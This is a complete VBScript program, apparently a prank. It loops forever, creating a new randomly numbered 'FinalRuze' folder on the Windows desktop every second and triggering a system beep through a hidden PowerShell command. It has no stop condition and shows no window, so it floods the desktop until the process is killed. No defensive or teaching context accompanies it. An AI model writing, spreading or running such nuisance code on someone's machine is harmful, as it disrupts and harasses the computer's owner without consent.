Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strDesktopPath = objShell.SpecialFolders("Desktop")

Do While True
    ' Create a new folder with a random number suffix
    Randomize
    folderName = "FinalRuze" & CStr(Int((999999-100000+1)*Rnd+100000))
    objFSO.CreateFolder strDesktopPath & "\" & folderName
    
    ' Play the system beep sound
    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
    
    ' Wait for 1 second before creating the next folder
    WScript.Sleep 1000
Loop
